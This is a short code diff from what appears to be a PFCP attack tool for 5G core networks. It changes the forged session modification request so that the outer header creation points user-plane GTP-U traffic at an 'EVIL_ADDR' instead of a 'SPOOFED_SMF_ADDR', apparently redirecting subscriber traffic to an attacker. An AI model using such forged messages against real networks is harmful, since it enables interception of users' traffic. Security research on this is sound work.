@@ -124,7 +124,7 @@ def Build_PFCP_session_modification_req(seid, far_id, src_addr=None, dest_addr=N
                 IE_OuterHeaderCreation(
                 GTPUUDPIPV4=1,
                 TEID=new_teid(randomize=True),
-                ipv4=SPOOFED_SMF_ADDR,
+                ipv4=EVIL_ADDR,
                 port=2152 
                 ),
                 
